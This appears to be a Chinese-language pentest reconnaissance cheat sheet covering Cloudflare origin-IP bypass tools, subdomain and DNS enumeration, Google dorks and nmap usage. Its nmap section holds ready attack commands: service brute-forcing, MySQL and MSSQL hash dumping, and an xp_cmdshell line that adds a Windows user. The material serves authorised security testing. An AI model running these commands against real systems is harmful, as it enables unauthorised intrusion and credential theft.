	Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000
	十进制数487098378取出转为十六进制数1d08880a
	0a.88.08.1d
	转为十进制数10.136.8.29
10.网站漏洞
	phpinfo等探针
11.网络空间搜索引擎
	fofa title=""
12.通过SSL证书
	https://censys.io/certificates?q=
	parsed.names:target.com and tags.raw:trusted
	*.target.com SHA-256
	https://censys.io/certificates/SHA-256
	Explore What's using this certificate? IPv4 Hosts
	ip:443 or ip 显示网站内容
	https://censys.io/ipv4/help?q=SHA-1
13.通过HTTP标头
	https://censys.io/ipv4?q=80.http.get.headers.server:cloudflare
14.通过网站返回的内容
	https://www.shodan.io/search?query=http.html:UA-93577176-1
15.用Fiddler或者Burp抓取目标网站的App(如果有)的请求地址
16.XML-RPC Pingback
	check if it's enable: https://www.target.com/xmlrpc.php
	should get the following:XML-RPC server accepts POST requests only
	WordPress XML-RPC Pingback API: https://codex.wordpress.org/XML-RPC_Pingback_API

### Bypass Cloudflare protection

- cloudsnare.py: censys certificates (key required)

	- https://gist.githubusercontent.com/chokepoint/28bed027606c5086ed9eeb274f3b840a/raw/ef1d20b613aa4757152c145d3854d2f5a2c79cb3/cloudsnare
pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org censys
python3 cloudsnare.py target.com

- HatCloud: crimeflare, ipinfo.io

	- https://github.com/HatBashBR/HatCloud
ruby hatcloud.rb -b your site

- CrimeFlare: crimeflare, ipinfo.io

	- http://www.crimeflare.com/cfs.html

- bypass-firewalls-by-DNS-history: securitytrails, crimeflare

	- https://github.com/vincentcox/bypass-firewalls-by-DNS-history
apt install jq
bash bypass-firewalls-by-DNS-history.sh -d example.com

When you find a bypass, you have two options:
Edit your host-file, which is a system-wide solution. You can find your host-file at /etc/hosts(Linux/Mac) or c:\Windows\System32\Drivers\etc\hosts (Windows). Add an entry like this: 80.40.10.22 vincentcox.com.
Burp Suite Project options Connections Hostname Resolution

- CloudFail: dnsdumpster, crimeflare, subdomain brute force

	- https://github.com/m0rtem/CloudFail
pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org -r requirements.txt
python3 cloudfail.py --target xxx.com
using Tor:
service tor start
python3 cloudfail.py --target xxx.com --tor

- CloudFlair: censys key required

	- export CENSYS_API_ID=...
export CENSYS_API_SECRET=...
git clone https://github.com/christophetd/cloudflair.git
cd cloudflair/
pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org -r requirements.txt
python3 cloudflair.py myvulnerable.site

- CloudIP: nslookup some subdomains (ftp, cpanel, mail, direct, direct-connect, webmail, portal)

	- https://github.com/Top-Hat-Sec/thsosrtl/blob/master/CloudIP/cloudip.sh
./cloudip.sh

### http://ipwhois.cnnic.net.cn/

### https://www.ipaddress.com/

### https://iphunter.net/

### https://myip.ms/

### https://ipinfo.io/

### https://bgp.he.net/

### https://www.ipaddress.com/

### https://censys.io/ipv4

### 邮件交换记录 nslookup -type=mx target.com 8.8.8.8

### https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py

### https://github.com/vincentcox/bypass-firewalls-by-DNS-history

### http://www.ip138.com/

### http://www.webscan.cc/

### https://www.17ce.com/

### https://www.ipip.net/

### https://www.yougetsignal.com/tools/web-sites-on-web-server/

### https://reverseip.domaintools.com/

### Reverse IP Lookup: https://hackertarget.com/reverse-ip-lookup/

### Subnet Lookup: https://hackertarget.com/subnet-lookup-online/

### Banner Grabbing (Search): https://hackertarget.com/banner-grabbing/

## 敏感目录

### https://github.com/maurosoria/dirsearch.git

### https://github.com/nccgroup/dirble/

### https://github.com/7kbstorm/7kbscan-WebPathBrute

### https://github.com/H4ckForJob/dirmap

### https://github.com/OJ/gobuster

### https://github.com/xmendez/wfuzz

### https://sourceforge.net/projects/dirbuster/files/DirBuster%20Source/1.0-RC1/

## 应用信息

### https://www.tianyancha.com/

### https://www.qichacha.com/

### https://www.qimai.cn/

### https://apps.apple.com/

## 政府网站基本信息

### http://114.55.181.28/databaseInfo/index

## url搜集

### https://github.com/hakluke/hakrawler

## C段

### https://www.webscan.cc/

### https://phpinfo.me/

### for ip in $(seq 1 254); do ping -c 1 192.168.100.$ip | grep "64 bytes" | cut -d " " -f 4 | sed 's/.$//' & done

## whois信息

### http://nicolasbouliane.com/utils/whois/?url=http://baidu.com

### http://whois.xinnet.com/

### https://lookup.icann.org/

### https://whois.aizhan.com/

### http://whois.chinaz.com/

## 历史资产

### https://web.archive.org/

## 网站备份文件

### ihoneyBakFileScan v0.2 

## 信用信息

### http://www.gsxt.gov.cn/index.html

### http://company.xizhi.com/

### https://www.creditchina.gov.cn/

## 备案信息

### http://www.beianbeian.com/

### http://icp.chinaz.com/

### https://www.aizhan.com/seo/

### http://www.beian.miit.gov.cn/publish/query/indexFirst.action

### https://www.sec.gov/edgar/searchedgar/companysearch.html

## 敏感js信息

### https://github.com/Threezh1/JSFinder

### https://github.com/GerbenJavado/LinkFinder.git

## 子域名

### https://searchdns.netcraft.com/

### knock

- git clone https://github.com/guelfoweb/knock
apt-get install python-dnspython
vim config.json 添加VT API KEY
python setup.py install

### subDomainsBrute

- https://github.com/lijiejie/subDomainsBrute

### Sublist3r

- git clone https://github.com/aboul3la/Sublist3r
pip install --user -r requirements.txt

### https://phpinfo.me/domain/

### https://github.com/appsecco/the-art-of-subdomain-enumeration/

### https://github.com/shmilylty/OneForAll.git

### http://www.yunsee.cn/info.html

### https://crt.sh/?q=target.com

### https://myssl.com/

### https://developers.facebook.com/tools/ct/

### AltDNS

### Amass

### Assets-from-spf

### BiLE-suite

### Bing

### Censys_subdomain_enum.py

### Cloudflare_enum.py

### Crt_enum_web.py

### CTFR

### Dig

### Domains-from-csp

### Knock

### Ldns-walk

### Massdns

### Rapid7 Forward DNS dataset (Project Sonar)

### San_subdomain_enum.py

### Second Order

### Subbrute

### Subfinder

### Sublist3r

### Layer

### vhost-brute

### Virtual-host-discovery

### https://dnsdumpster.com/

### https://www.threatcrowd.org/

### https://www.nmmapper.com/sys/tools/subdomainfinder/
http://dns.bufferover.run/dns?q=target.com
https://dnsdumpster.com/
https://subdomainfinder.c99.nl/

## DNS

### http://tool.chinaz.com/

### https://ti.qianxin.com/

### https://dnsdb.io/zh-cn/

### http://www.beianbeian.com/

### https://www.virustotal.com/

### https://x.threatbook.cn/

### https://viewdns.info/

### http://www.yunsee.cn/

### https://dnsdumpster.com/

### https://hackertarget.com/dns-lookup/

### 查找A记录: https://hackertarget.com/find-dns-host-records/

### Reverse DNS: https://hackertarget.com/reverse-dns-lookup/

### Whois Lookup: https://hackertarget.com/whois-lookup/

### Zone Transfer: https://hackertarget.com/zone-transfer/

### https://spyse.com/

### https://api.hackertarget.com/zonetransfer/?q=target.com

### 命令查询DNS解析信息

- nslookup target.com 8.8.8.8
nslookup -type=ns target.com
nslookup -type=mx target.com
nslookup -type=txt target.com
host -t A target.com
dig target.com txt
dig target.com a +tcp
dig target.com a +trace
dig @nsserver target.com axfr
dig @8.8.8.8 www.target.com a/mx/ns
whois -p port target.com

### 域名注册信息查询

- https://com.all-url.info/

## 端口

### masscan+nmap

- masscan -p1-65535 10.10.10.10 --rate=1000 -e tun0 > ports
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
nmap -Pn -sV -sC -p$ports 10.10.10.10

### F-NAScan

- git clone https://github.com/BLKStone/F-NAScan
pip install openpyxl
pip install --user validators

### http://tool.chinaz.com/port/

### https://github.com/phantom0301/PTscan

### PortQryV2.exe

- PortQryV2 -n ip -e port -p udp

	- https://download.microsoft.com/download/0/d/9/0d9d81cf-4ef2-4aa5-8cea-95a935ee09c9/PortQryV2.exe

### nc.exe

- nc -znv ip port
- nc -znv ip port-port
- echo -e "GET / HTTP/1.0\r\n\r\n" | nc -vq 5 -n 服务器IP 端口
- nc通过socks代理建立连接(输出提示不可信)
nc -nv -X 5 -x 127.0.0.1:1088 18.223.135.153 9898
4 SOCKS v.4
5 SOCKS v.5（默认）
connect HTTPS proxy

## Google Hacking

### 管理后台

- filetype:txt 登录  
filetype:xls 登录  
filetype:doc 登录  
intitle:后台管理  
intitle:login
intitle:后台管理  inurl:admin  
intitle:index of / 

### 指定网站

- site:example.com filetype:txt 登录  
site:example.com intitle:后台管理
site:example.com admin
site:example.com login
site:example.com system
site:example.com 管理
site:example.com 登录
site:example.com 内部
site:example.com 系统  

## Cyberspace Search Engine

### https://www.shodan.io/

### https://www.zoomeye.org/

### https://securitytrails.com/

### https://www.netcraft.com/

### https://fofa.so/

### https://www.censys.io

### https://www.oshadan.com/

## 网络侦察工具

### https://ivre.rocks/

## Pentesting-Online

### http://tools.hexlt.org/

## Vulnerabilities-Check

### http://0day.websaas.com.cn/

### https://www.punkspider.org/

### WordPress: WPScan 

- https://wpvulndb.com/
https://wpscan.org/
https://wpscan.io/

## 指纹

### https://whatcms.org/
https://www.whatweb.net/

### waf指纹

- https://github.com/EnableSecurity/wafw00f
https://github.com/zerokeeper/WebEye
https://github.com/urbanadventurer/WhatWeb

### http://www.yunsee.cn/

### http://finger.tidesec.net/

### http://whatweb.bugscaner.com/look/

### https://fp.shuziguanxing.com/#/

## XSS-Check

### https://sec.ly.com/xsspt.txt

## Website-Service-Vulnerability

### Nikto

- https://github.com/sullo/nikto

## Website-Info

### https://www.adminbooster.com/tool/site_review

### Extract Links From Page: https://hackertarget.com/extract-links/

### HTTP Header Check: https://hackertarget.com/http-header-check/

## 各种定位/网站后台

### http://re.chinacycc.com/

## Nmap-Online

### http://nmap.online-domain-tools.com/

## Nmap Scripts Manual

### https://nmap.org/nsedoc/

- 端口服务信息:
nmap -sV -sT -Pn --open -v 10.95.14.211
nmap -sT -Pn --open -v banner.nse 10.95.14.211

FTP相关漏洞检测:
nmap -p 21 --script ftp-anon.nse -v 10.95.14.211
nmap -p 21 --script ftp-brute.nse -v 10.95.14.211
nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 10.95.14.211
nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 10.95.14.211

SSH相关脚本:
nmap -p 22 --script sshv1.nse -v 192.168.3.23

SMTP相关脚本:
nmap -p 25 --script smtp-brute.nse -v 192.168.3.23
nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23
nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23
nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23
nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23

POP3相关脚本:
nmap -p 110 --script pop3-brute.nse -v 192.168.3.23

IMAP相关脚本:
nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23

DNS相关脚本:
nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23
nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.3.23
nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23

数据库相关脚本:
nmap -p 9088 --script informix-brute.nse 192.168.3.23
nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23
nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23
nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=root' 192.168.3.23
nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v 192.168.3.23
nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24
nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24
nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" 192.168.3.0/24
nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24
nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24
nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v 192.168.3.0/24
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24
nmap -p 27017  --script mongodb-brute 192.168.3.0/24
nmap -p 6379 --script redis-brute.nse 192.168.3.0/24

SNMP相关脚本:
nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24

TELNET相关脚本:
nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24

LDAP相关脚本:
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' 192.168.3.0/24

XMPP爆破:
nmap -p 5222 --script xmpp-brute.nse  192.168.3.0/24

短文件扫描:
nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0/24

iis5.0/6.0 webdav:
nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24

bash远程执行:
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 192.168.3.0/24

探测目标svn:
nmap --script http-svn-info 192.168.3.0/24

wordpress爆破:
nmap -p80 -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.3.0/24

扫描目标网站备份:
nmap -p80 --script=http-backup-finder 192.168.3.0/24

iis6.0远程代码执行:
nmap -sV --script http-vuln-cve* --script-args uri='/anotheruri/'  192.168.3.0/24

识别目标pptp版本:
nmap -p 1723 --script pptp-version.nse 192.168.3.0/24

smb漏洞检测脚本:
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0/24

内网嗅探:
nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0/24

爆破目标的rsync:
nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.3.0/24

爆破目标的rlogin:
nmap -p 513 --script rlogin-brute 192.168.3.0/24

爆破目标的vnc:
nmap --script vnc-brute -p 5900 192.168.3.0/24

爆破pcanywhere:
nmap -p 5631 --script pcanywhere-brute 192.168.3.0/24

爆破nexpose:
nmap --script nexpose-brute -p 3780 192.168.3.0/24

使用shodan接口扫描:
nmap --script shodan-api --script-args 'shodan-api.target=192.168.3.0/24,shodan-api.apikey=SHODANAPIKEY'

利用nmap一句话进行目标C段常规漏洞扫描:
nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24

利用nmap一句话进行目标C段弱口令爆破:
nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24



